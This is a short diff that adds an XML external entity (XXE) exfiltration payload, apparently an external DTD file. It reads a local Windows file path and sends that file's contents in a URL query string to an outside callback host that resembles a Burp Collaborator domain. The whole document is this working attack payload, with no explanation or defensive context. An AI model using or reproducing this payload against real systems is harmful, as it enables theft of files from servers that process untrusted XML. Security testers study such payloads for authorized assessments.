@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///D:\QuadXChange\VirtualFolders\BookingFile\CD\20241021_1059111011_image.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://do5h87ua16nabm8hx0ys10ufs6yxmvak.l.prod.burpcloth.infosec.a2z.com/?x=%file;'>">
+%eval;
+%exfil;
